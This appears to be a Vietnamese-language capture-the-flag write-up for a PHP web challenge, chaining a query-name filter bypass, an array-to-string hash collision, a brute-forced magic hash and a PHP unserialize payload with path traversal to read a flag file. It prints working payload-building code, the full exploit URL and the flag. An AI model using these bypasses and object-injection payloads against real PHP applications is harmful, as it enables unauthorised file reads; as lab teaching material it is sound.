---
title: Ultimative PHP
date: 2026-10-12
ctf: FortID CTF 2026
category: web
difficulty: Silver 3
tags:
  - PHP
  - Type Juggling
  - Path Traversal
---

## Solution

Trang yêu cầu 4 điều kiện, mỗi điều kiện khai thác một lỗi PHP riêng:

1. Phải là `administrator`, nhưng tham số `access_level` bị chặn thẳng -> dùng `access.level` (PHP tự đổi dấu `.` thành `_` khi đặt tên biến từ query).
2. Hai "recovery answer" phải khác nhau nhưng hash SHA-256 phải giống nhau -> dùng mảng.
3. `code` có MD5 và SHA-256 (9 ký tự đầu) khác chuỗi nhưng `==` phải đúng -> tìm chuỗi dạng `0e…` (magic hash).
4. Profile bị `unserialize` với class `LegacyTemplate` -> path traversal để đọc `/tmp/flag`.

Qua điều kiện 1: code chặn chuỗi `access_level` trong query thô, nhưng lại đọc giá trị qua `$_GET['access_level']`. PHP chuyển `.` thành `_` khi parse query string thành superglobal, nên gửi `access.level=administrator` vừa không bị chặn ở bước lọc chuỗi, vừa được PHP đọc thành `$_GET['access_level']`.

Điều kiện 2, recovery answer dạng mảng: `get_debug_type` của hai giá trị phải giống nhau (cả hai là `array`), `$primary === $backup` phải sai (`primary[0]=a`, `backup[0]=b` khác nhau), nhưng khi nối chuỗi để hash thì `'legacy-recovery:v1:' . $array` luôn ra `"...:Array"` kèm warning `Array to string conversion` — hai mảng khác nhau nối ra cùng một chuỗi, nên hash SHA-256 trùng nhau.

Điều kiện 3, magic hash: `$material = 'ULTIMATIVE-PHP-2026:' . $code`, check là:

```php!
$legacyDigest !== $modernDigest && $legacyDigest == $modernDigest
```

9 ký tự đầu của MD5 và SHA-256 phải đều là chuỗi dạng `0e<số>` (PHP coi là số khi so sánh lỏng), và khi cả hai cùng là `0e...` thì giá trị số đều bằng 0 nên `==` đúng trong khi chuỗi gốc khác nhau. Brute force tìm `code`:

```python!
import hashlib, re
pat = re.compile(r"^\d+e\d+$")
for i in range(10**8):
    code = str(i)
    m = hashlib.md5(("ULTIMATIVE-PHP-2026:" + code).encode()).hexdigest()[:9]
    if not pat.match(m):
        continue
    s = hashlib.sha256(("ULTIMATIVE-PHP-2026:" + code).encode()).hexdigest()[:9]
    if pat.match(s) and m != s and float(m) == float(s) and float(m) == 0:
        print(code, m, s)  # 59036305 -> 0e3791209 / 0e9920675
        break
```

Ra `code=59036305` (MD5 `0e3791209`, SHA-256 `0e9920675`). Lưu ý tránh kết quả có số mũ lớn kiểu `8098e2347`, vì khi đó PHP coi hai số vô hạn cùng dấu là không bằng nhau và quay về so sánh chuỗi.

Điều kiện 4, profile và path traversal: `LegacyTemplate::__toString` đọc `__DIR__ . '/templates/' . $template`. Code chặn `../` bằng `if (strpos($this->template, '../'))` — nhưng `strpos` trả về `0` khi tìm thấy ở đầu chuỗi, và `0` là falsy trong PHP, nên nếu `../` nằm ngay đầu chuỗi thì điều kiện coi như không match, filter bị vượt qua ngay tại chỗ tưởng đã chặn. Đặt `template` bắt đầu bằng `../` lặp lại để đi lên đủ cấp từ `templates/` tới `/tmp/flag`.

Profile cần là object `MigratedProfile` có `displayName` là object `LegacyTemplate`. Khi `(string)$profile` được gọi, `__toString` của `LegacyTemplate` sẽ đọc file cho ta:

```python!
import base64
tpl = "../../../../tmp/flag"
lt = f'O:14:"LegacyTemplate":1:{{s:8:"template";s:{len(tpl)}:"{tpl}";}}'
ser = f'O:15:"MigratedProfile":1:{{s:11:"displayName";{lt}}}'
profile = base64.urlsafe_b64encode(ser.encode()).decode().rstrip("=")
print(profile)
```

Gộp cả 4 bước lại:

```
/?access.level=administrator&primary[0]=a&backup[0]=b&code=59036305&profile=<profile>
```

Flag nằm trong thẻ `<p class="flag">`.

-> Flag: `FortID{C0RP_M1GR4T10N_1S_WH3R3_D4T4_G03S_T0_D13_10e12d3ef0}`
